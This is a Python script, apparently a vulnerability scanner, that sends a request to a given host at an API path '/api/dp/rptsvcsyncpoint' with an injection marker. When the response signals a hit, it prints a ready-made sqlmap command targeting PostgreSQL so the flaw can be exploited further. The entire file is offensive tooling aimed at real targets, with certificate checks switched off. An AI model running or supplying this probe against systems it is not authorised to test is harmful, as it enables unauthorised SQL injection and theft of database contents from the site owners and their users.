import sys
import warnings
import requests
import click
from concurrent.futures import ThreadPoolExecutor

W = '33[0m'
G = '33[1;32m'
R = '33[1;31m'
O = '33[1;33m'
B = '33[1;34m'

def run(url):
    result = ['','不存在']
    payload = "/api/dp/rptsvcsyncpoint?ccid=1*"
    headers = { "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "zh-CN,zh;q=0.9",
                "Connection": "close"
        }
    vulnurl = url + payload
    if("http" in vulnurl):
        vulnurl = vulnurl
    else:
        vulnurl = "http://" + vulnurl
    try:
        req = requests.get(vulnurl, headers=headers, timeout=3, verify=False)
        if r"success" in req.text :
            result[1] = '存在'
            result[0] = vulnurl + '需要进一步验证,SQLMAP语法:sqlmap.py -u "%s" --dbms PostgreSQL --batch'%(vulnurl)
            print(G,result[0],W)
        else:
            result[1] = '不存在'
    except:
        result[1] = '不存在'
    return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
